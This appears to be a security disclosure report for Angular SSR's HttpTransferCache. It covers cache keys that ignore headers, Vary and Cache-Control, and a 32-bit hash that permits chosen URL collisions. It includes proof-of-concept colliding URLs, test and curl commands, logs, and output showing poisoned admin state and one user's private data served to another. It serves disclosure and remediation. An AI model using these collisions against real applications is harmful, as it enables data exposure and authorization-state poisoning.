# Angular SSR HttpTransferCache ignores Vary and request-header variants, causing wrong-response replay

## Summary

Angular SSR `HttpTransferCache` caches GET/HEAD responses by default during server rendering and
replays those responses during hydration. The cache key omits request headers and cookie/credentials
state. Angular also ignores backend `Vary` and `Cache-Control: private, no-store` semantics. Finally,
the full key is reduced to a collision-prone 32-bit hash, so distinct URLs can share a
`TransferState` entry.

As a result, two same-URL requests that intentionally vary by `Cookie`, `X-Tenant`,
`Accept-Language`, API-version headers, or other request headers can share the same `TransferState`
entry. Angular can then replay a response generated for one request variant to a different request
variant without hitting the backend.

Separately, two different URLs that collide on Angular's 32-bit hash can also share the same
`TransferState` entry.

The collision can be chosen against a fixed victim URL when the attacker controls part of another URL
requested during SSR. In the PoC, `/poison?x=yazbadgl` collides with `/api/profile`; Angular returns
`ATTACKER_CONTROLLED_BODY` for `/api/profile` without contacting the profile backend.

The same primitive can poison a trusted authorization/bootstrap endpoint. In the PoC,
`/feed?x=uibaalzu` collides with `/api/me`. The real `/api/me` endpoint would return
`{role: "user"}` for the victim cookie, but Angular returns the attacker-controlled feed response
`{role: "admin"}` as the `/api/me` result and the SSR component renders admin-gated content.

A separate shared-cache PoC demonstrates the conditional high-impact chain: Angular SSR embeds a
`Cache-Control: private, no-store` API response into HTML/`ng-state`, and a shared HTML cache keyed
only by URL then serves Alice's private SSR response to Bob.

This is a cache-key / trusted-state replay issue in Angular's framework-level SSR transfer cache.
It is not HTTP request smuggling.

## Product / Component

- Product: Angular
- Component: `@angular/common/http` `HttpTransferCache` with SSR/hydration
- Affected code:
  - `packages/common/http/src/transfer_cache.ts`
  - `packages/platform-browser/src/hydration.ts`

## Severity

Suggested severity: Medium for the framework primitive alone. High may be appropriate for
applications where SSR-rendered sensitive data, tenant selection, entitlements, or authorization
decisions trust transfer-cached `HttpClient` responses, or where poisoned/private SSR HTML is
delivered cross-user by a shared cache.

The framework bug is confirmed in default SSR/hydration behavior. Higher impact depends on the
application using security-relevant same-URL variants, such as tenant, cookie, locale, or API-version
headers, using attacker-influenced SSR fetches before trusted bootstrap endpoints, or on an outer
CDN/proxy caching SSR HTML that contains poisoned `TransferState`.

## Affected Defaults

Angular documents that SSR `HttpClient` transfer cache is enabled by `provideClientHydration()` and
that default caching includes GET/HEAD requests unless they contain `Authorization` or
`Proxy-Authorization`.

The implementation follows that behavior:

- `shouldCacheRequest()` excludes `Authorization` and `Proxy-Authorization`, but not `Cookie`,
  `X-Tenant`, `Accept-Language`, credentials flags, or response `Vary`.
- `makeCacheKey()` uses only method, response type, mapped URL, serialized body, and params.
- response storage does not reject `Cache-Control: private` or `Cache-Control: no-store`.
- the complete key string is reduced to `generateHash(key)` before `makeStateKey()`.
- `retrieveStateFromCache()` returns a cached response before backend dispatch.

## Technical Details

Relevant code:

```text
packages/common/http/src/transfer_cache.ts:126-143
packages/common/http/src/transfer_cache.ts:182-188
packages/common/http/src/transfer_cache.ts:322-337
packages/common/http/src/resource.ts:248-258
packages/platform-browser/src/hydration.ts:283-285
adev/src/content/guide/ssr.md:428-435
```

The cache key is:

```text
[method, responseType, mappedRequestUrl, serializedBody, encodedParams].join('|')
```

It does not include request headers or credentials. It also cannot honor backend `Vary`, because
`Vary` is not considered during cache lookup and is not used to partition entries.

Even when `Vary` is explicitly transferred with `transferCache: {includeHeaders: ['Vary']}`, Angular
still replays the response to a different request-header variant.

Similarly, responses marked `Cache-Control: private, no-store` are serialized into `TransferState`.
Even when `Cache-Control` is transferred with
`transferCache: {includeHeaders: ['Cache-Control']}`, Angular still replays the cached body.

The final `StateKey` is only a 32-bit hash. A birthday search finds collisions quickly, and Angular
does not compare the original request key before replaying a cached response.

## Proof Of Concept

Artifacts:

```text
bugs/angular/a18-transfer-cache-request-variant-confusion/poc/transfer_cache_header_probe.ts
bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app/server.ts
bugs/angular/a18-transfer-cache-request-variant-confusion/evidence/2026-04-29-angular-transfer-cache-header-probe.md
```

### Angular-owned test target

Temporary tests inserted into `packages/common/http/test/transfer_cache_spec.ts` confirmed:

```text
GET /profile with Cookie: sid=alice -> caches alice-private
GET /profile without Cookie         -> backend not hit; receives alice-private

GET /vary-tenant with X-Tenant: tenant-a, response Vary: X-Tenant -> caches tenant A
GET /vary-tenant with X-Tenant: tenant-b -> backend not hit; receives tenant A

GET /vary-transferred with includeHeaders ['Vary'] -> client sees Vary: X-Tenant
GET /vary-transferred with X-Tenant: tenant-b -> backend not hit; receives tenant A

GET /no-store-private, response Cache-Control: private, no-store -> caches private body
GET /no-store-private -> backend not hit; receives private body

GET /no-store-transferred with includeHeaders ['Cache-Control'] -> client sees private, no-store
GET /no-store-transferred -> backend not hit; receives private body

GET /collision/4du1y3wwrg responseType text -> caches first-colliding-url
GET /collision/xjb04p9--8 responseType text -> backend not hit; receives first-colliding-url

GET /poison?x=yazbadgl responseType text -> caches ATTACKER_CONTROLLED_BODY
GET /api/profile responseType text -> backend not hit; receives ATTACKER_CONTROLLED_BODY

GET /feed?x=uibaalzu responseType json -> caches {"user":"attacker","role":"admin","source":"feed"}
GET /api/me responseType json -> backend not hit; receives {"user":"attacker","role":"admin","source":"feed"}
```

Command:

```bash
bazelisk --output_user_root=/tmp/vulnhunter-bazel-user test //packages/common/http/test:test --test_filter='TransferCache withHttpTransferCache should transfer but not honor Vary when includeHeaders contains Vary'
```

Result:

```text
//packages/common/http/test:test PASSED
```

### Canonical SSR app

The standalone SSR app uses:

```text
Angular 19.2.21
renderApplication()
provideServerRendering()
provideClientHydration()
provideHttpClient(withFetch(), withInterceptors([cookieForwarder]))
```

The backend endpoint `/api/hits` returns `Vary: X-Tenant` and
`Cache-Control: private, no-store`. The Angular component makes two sequential same-URL requests:

```text
GET /api/hits with X-Tenant: tenant-a
GET /api/hits with X-Tenant: tenant-b
```

Observed rendered HTML:

```html
<div id="hits">tenant:tenant-a|tenant:tenant-a</div>
<div id="collision">collision:xisvtfhqif|collision:xisvtfhqif</div>
<div id="profile">poison=ATTACKER_CONTROLLED_BODY|profile=ATTACKER_CONTROLLED_BODY</div>
```

Observed server log:

```text
[api] /poison hit query= {"x":"yazbadgl"}
[ssr] poison body: ATTACKER_CONTROLLED_BODY
[ssr] profile body: ATTACKER_CONTROLLED_BODY
[api] /api/hits hit 1 tenant= "tenant-a"
[ssr] first tenant body: tenant:tenant-a
[ssr] second tenant body: tenant:tenant-a
[api] /collision hit 1 id= "xisvtfhqif"
[ssr] first collision body: collision:xisvtfhqif
[ssr] second collision body: collision:xisvtfhqif
[express] api hit counts profile= 0 tenant= 1 collision= 1
```

The tenant B request did not hit the backend even though the first response declared
`Vary: X-Tenant` and `Cache-Control: private, no-store`.

The second collision URL also did not hit the backend. The colliding absolute SSR keys were:

```text
GET|text|http://127.0.0.1:4218/collision/xisvtfhqif||
GET|text|http://127.0.0.1:4218/collision/b3g_cxklta||
```

Both reduce to `StateKey` `1032318893`.

The chosen collision against `/api/profile` reduces both keys to `StateKey` `3782937776`:

```text
GET|text|http://127.0.0.1:4218/poison?x=yazbadgl||
GET|text|http://127.0.0.1:4218/api/profile||
```

The chosen collision against `/api/me` reduces both JSON keys to `StateKey` `2884615638`:

```text
GET|json|http://127.0.0.1:4218/feed?x=uibaalzu||
GET|json|http://127.0.0.1:4218/api/me||
```

Observed rendered HTML:

```html
<div id="authz">feed={"user":"attacker","role":"admin","source":"feed"}|me={"user":"attacker","role":"admin","source":"feed"}|ADMIN_PANEL_SECRET</div>
```

Observed server log:

```text
[api] /feed hit 1 query= {"x":"uibaalzu"}
[ssr] feed body: {"user":"attacker","role":"admin","source":"feed"}
[ssr] me body: {"user":"attacker","role":"admin","source":"feed"}
[express] api hit counts profile= 0 me= 0 feed= 1 tenant= 1 collision= 1
```

`/api/me` was never requested from the backend. The admin-gated content was rendered from the
attacker-controlled feed response.

### Shared HTML cache confidentiality chain

PoC file:

```text
bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app/shared_cache_private_state_server.ts
```

The origin API sends:

```text
GET /api/private
Vary: Cookie
Cache-Control: private, no-store
Body: private:<cookie>
```

Commands:

```bash
./node_modules/.bin/tsx shared_cache_private_state_server.ts
curl -sS -i -H 'Cookie: sid=alice' 'http://127.0.0.1:4221/private?case=seq1'
curl -sS -i -H 'Cookie: sid=bob' 'http://127.0.0.1:4221/private?case=seq1'
```

Alice response:

```text
X-Proxy-Cache: MISS
```

```html
<div id="private">private:sid=alice</div>
<script id="ng-state" type="application/json">{"3517752801":{"b":"private:sid=alice","h":{},"s":200,"st":"OK","u":"http://127.0.0.1:4220/api/private","rt":"text"},"__nghData__":[{}]}</script>
```

Bob response:

```text
X-Proxy-Cache: HIT
```

```html
<div id="private">private:sid=alice</div>
<script id="ng-state" type="application/json">{"3517752801":{"b":"private:sid=alice","h":{},"s":200,"st":"OK","u":"http://127.0.0.1:4220/api/private","rt":"text"},"__nghData__":[{}]}</script>
```

Bob sent `Cookie: sid=bob` but received Alice's private API body from cached SSR HTML.

## Security Impact

Confirmed impact:

- wrong-response replay across SSR/hydration;
- request-header variants collapse into the same trusted `TransferState` entry;
- backend `Vary` does not protect header-varied responses from Angular transfer-cache replay.
- backend `Cache-Control: private, no-store` does not prevent the response body being serialized into
  SSR HTML `TransferState`.
- distinct URL responses can be confused through practical 32-bit hash collisions.
- chosen collision can replay attacker-controlled response content into a fixed sensitive URL.

Potential impact in real applications:

- cross-tenant data confusion when tenant selection is header-based;
- user data exposure when SSR forwards cookies to backend APIs and SSR HTML is cached or reused by an
  outer cache;
- private API data embedded into otherwise cacheable HTML documents;
- cache poisoning between distinct URLs when an attacker can influence one URL requested during SSR
  and collide it with another URL in the same render/hydration boundary;
- locale/API-version/content integrity confusion when APIs vary by `Accept-Language` or version
  headers;
- client-side authorization or UI decisions made from a trusted cached response for the wrong variant.
- SSR authorization/bootstrap poisoning when attacker-controlled content is replayed into fixed
  endpoints such as `/api/me`, feature flags, entitlements, tenant bootstrap, or profile APIs.
- Cross-user confidentiality impact when an outer shared cache stores SSR HTML containing serialized
  private/no-store API responses.

## Limitations

- This is not a request smuggling bug.
- Cross-user confidentiality impact requires an app/deployment chain, for example shared caching of
  SSR HTML containing `TransferState`, or a page that naturally makes attacker-controlled and victim
  request variants in one render/hydration boundary.
- The `/api/me` PoC demonstrates poisoned SSR authorization/UI decisions, not direct backend
  authorization bypass.
- The shared-cache PoC intentionally models a URL-keyed cache that ignores `Cookie`; it proves the
  chain but remains deployment-dependent.
- Applications can mitigate by disabling transfer cache globally or per sensitive endpoint with
  `withNoHttpTransferCache()`, `filter`, or `transferCache: false`.

## Suggested Fix

Conservative options:

- do not cache responses with `Vary` unless Angular can honor all listed request-header dimensions;
- include relevant request headers in the transfer cache key when `Vary` is present;
- do not cache responses with `Cache-Control: no-store` or `private` unless explicitly opted in;
- replace the 32-bit hash state key with a collision-resistant key or store and compare the original
  request key before replay;
- treat `Cookie` and credential-bearing requests as auth-sensitive by default, similarly to
  `Authorization`;
- document that `HttpTransferCache` ignores `Vary`/`Cache-Control` and require explicit opt-in for
  header-varied or private responses.
